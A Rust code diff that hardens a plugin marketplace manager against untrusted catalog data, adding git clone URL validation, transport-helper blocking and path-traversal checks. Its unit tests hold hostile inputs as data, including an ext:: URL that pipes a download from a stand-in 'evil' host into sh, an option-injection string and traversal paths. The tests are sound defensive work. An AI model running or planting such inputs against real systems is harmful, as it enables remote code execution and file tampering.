@@ -303,6 +303,75 @@ impl MarketplaceManager {
         }
     }
 
+    /// Reduces a (network-catalog-supplied, untrusted) plugin id to a single
+    /// safe path component for use as a directory name.
+    ///
+    /// Rejects ids that could traverse directories (`..`, path separators,
+    /// absolute/drive-prefixed paths, NUL). Forward slashes — used in ids like
+    /// `owner/plugin` — are collapsed to `-` first, matching prior behavior.
+    fn sanitize_plugin_dir_name(id: &str) -> MarketplaceResult<String> {
+        let name = id.replace('/', "-");
+        let unsafe_name = name.is_empty()
+            || name == "."
+            || name == ".."
+            || name.contains("..")
+            || name.contains('\\')
+            || name.contains('\0')
+            || name.contains(':')
+            || Path::new(&name).is_absolute()
+            || Path::new(&name).components().count() != 1;
+        if unsafe_name {
+            return Err(MarketplaceError::InvalidPath(format!(
+                "unsafe plugin id: {id}"
+            )));
+        }
+        Ok(name)
+    }
+
+    /// Validates a git clone URL fetched from a (network-sourced, untrusted)
+    /// marketplace catalog.
+    ///
+    /// Git supports "transport helper" URLs such as `ext::sh -c '<cmd>'` and
+    /// `fd::`, which cause git itself to execute an arbitrary command. Because
+    /// the marketplace catalog is fetched over the network, its `repository`
+    /// field must never be handed to `git clone` without an allow-list. Only
+    /// ordinary https/ssh remotes are permitted.
+    fn validate_clone_url(url: &str) -> MarketplaceResult<()> {
+        let u = url.trim();
+        if u.is_empty() {
+            return Err(MarketplaceError::CloneError(
+                "empty repository URL".to_string(),
+            ));
+        }
+        // `ext::`, `fd::`, `transport::helper` style URLs run arbitrary commands.
+        if u.contains("::") {
+            return Err(MarketplaceError::CloneError(format!(
+                "refusing repository URL with a transport helper: {u}"
+            )));
+        }
+        // A leading '-' would be parsed by git as an option.
+        if u.starts_with('-') {
+            return Err(MarketplaceError::CloneError(format!(
+                "refusing repository URL that looks like an option: {u}"
+            )));
+        }
+        // Whitespace/control characters could split or smuggle arguments.
+        if u.chars().any(|c| c.is_control() || c == ' ') {
+            return Err(MarketplaceError::CloneError(
+                "repository URL contains whitespace or control characters".to_string(),
+            ));
+        }
+        let allowed = u.starts_with("https://")
+            || u.starts_with("ssh://")
+            || u.starts_with("git@"); // scp-like git@host:owner/repo
+        if !allowed {
+            return Err(MarketplaceError::CloneError(format!(
+                "unsupported repository URL (only https/ssh remotes allowed): {u}"
+            )));
+        }
+        Ok(())
+    }
+
     /// Clones a repository using git.
     ///
     /// If `source_path` is provided, uses sparse checkout to clone only the
@@ -312,6 +381,7 @@ impl MarketplaceManager {
         target_dir: &Path,
         source_path: Option<&str>,
     ) -> MarketplaceResult<()> {
+        Self::validate_clone_url(repo_url)?;
         // Ensure parent directory exists
         if let Some(parent) = target_dir.parent() {
             tokio::fs::create_dir_all(parent).await?;
@@ -329,7 +399,19 @@ impl MarketplaceManager {
     /// Performs a shallow clone of the entire repository.
     async fn clone_shallow(repo_url: &str, target_dir: &Path) -> MarketplaceResult<()> {
         let output = Command::new("git")
-            .args(["clone", "--depth", "1", repo_url])
+            // Disable transport helpers (belt-and-suspenders vs. validate_clone_url)
+            // and use `--` so a URL can never be parsed as an option.
+            .args([
+                "-c",
+                "protocol.ext.allow=never",
+                "-c",
+                "protocol.fd.allow=never",
+                "clone",
+                "--depth",
+                "1",
+                "--",
+                repo_url,
+            ])
             .arg(target_dir)
             .hide_console_window()
             .output()
@@ -349,6 +431,14 @@ impl MarketplaceManager {
     /// This is used for plugins that are subdirectories within a larger monorepo
     /// (e.g., anthropics/claude-code/plugins/frontend-design).
     async fn clone_sparse(repo_url: &str, target_dir: &Path, subpath: &str) -> MarketplaceResult<()> {
+        // The subdirectory comes from the untrusted catalog; reject anything
+        // that could escape the clone via `..` or an absolute path.
+        if subpath.contains("..") || Path::new(subpath).is_absolute() || subpath.contains('\0') {
+            return Err(MarketplaceError::InvalidPath(format!(
+                "unsafe plugin source path: {subpath}"
+            )));
+        }
+
         // Create a temporary directory for the sparse checkout
         let temp_dir = target_dir.with_file_name(format!(
             ".{}-sparse-temp",
@@ -363,11 +453,16 @@ impl MarketplaceManager {
         // Step 1: Clone with no checkout and blob filter for efficiency
         let output = Command::new("git")
             .args([
+                "-c",
+                "protocol.ext.allow=never",
+                "-c",
+                "protocol.fd.allow=never",
                 "clone",
                 "--filter=blob:none",
                 "--no-checkout",
                 "--depth",
                 "1",
+                "--",
                 repo_url,
             ])
             .arg(&temp_dir)
@@ -562,9 +657,18 @@ impl MarketplaceManager {
         // Determine install directory
         let install_base = self.get_install_dir(scope, project_path)?;
 
-        // Use plugin name for directory
-        let plugin_dir_name = plugin.id.replace('/', "-");
+        // Derive the on-disk directory from the (untrusted, catalog-supplied)
+        // plugin id, sanitized to a single safe path component so it cannot
+        // traverse out of the install base.
+        let plugin_dir_name = Self::sanitize_plugin_dir_name(&plugin.id)?;
         let plugin_dir = install_base.join(&plugin_dir_name);
+        // Defense in depth: the join must stay directly under install_base.
+        if plugin_dir.parent() != Some(install_base.as_path()) {
+            return Err(MarketplaceError::InvalidPath(format!(
+                "plugin id resolves outside the install directory: {}",
+                plugin.id
+            )));
+        }
 
         // Clone the repository (with sparse checkout for monorepo plugins)
         Self::clone_repository(repo_url, &plugin_dir, plugin.source_path.as_deref()).await?;
@@ -724,6 +828,43 @@ impl Default for MarketplaceManager {
 #[cfg(test)]
 mod tests {
     use super::*;
+
+    #[test]
+    fn validate_clone_url_rejects_ext_transport_rce() {
+        // git's ext:: transport executes an arbitrary command — must be rejected.
+        assert!(MarketplaceManager::validate_clone_url("ext::sh -c 'curl http://evil|sh'").is_err());
+        assert!(MarketplaceManager::validate_clone_url("fd::17/foo").is_err());
+        assert!(MarketplaceManager::validate_clone_url("file:///etc/passwd").is_err());
+        assert!(MarketplaceManager::validate_clone_url("--upload-pack=payload").is_err());
+        assert!(MarketplaceManager::validate_clone_url("https://h/r r").is_err()); // whitespace
+        assert!(MarketplaceManager::validate_clone_url("").is_err());
+    }
+
+    #[test]
+    fn validate_clone_url_allows_normal_remotes() {
+        assert!(MarketplaceManager::validate_clone_url("https://github.com/anthropics/claude-code").is_ok());
+        assert!(MarketplaceManager::validate_clone_url("ssh://git@github.com/o/r.git").is_ok());
+        assert!(MarketplaceManager::validate_clone_url("git@github.com:o/r.git").is_ok());
+    }
+
+    #[test]
+    fn sanitize_plugin_dir_name_blocks_traversal() {
+        // Attacker-controlled catalog ids must not escape the install base.
+        assert!(MarketplaceManager::sanitize_plugin_dir_name("..").is_err());
+        assert!(MarketplaceManager::sanitize_plugin_dir_name("../../etc/evil").is_err());
+        assert!(MarketplaceManager::sanitize_plugin_dir_name("..\\..\\Windows\\evil").is_err());
+        assert!(MarketplaceManager::sanitize_plugin_dir_name("C:\\Users\\v\\Startup\\evil").is_err());
+        assert!(MarketplaceManager::sanitize_plugin_dir_name("").is_err());
+        // Legitimate ids: `owner/plugin` collapses to a single safe component.
+        assert_eq!(
+            MarketplaceManager::sanitize_plugin_dir_name("anthropic/frontend-design").unwrap(),
+            "anthropic-frontend-design"
+        );
+        assert_eq!(
+            MarketplaceManager::sanitize_plugin_dir_name("my-plugin.v2").unwrap(),
+            "my-plugin.v2"
+        );
+    }
 
     #[test]
     fn test_add_remove_source() {
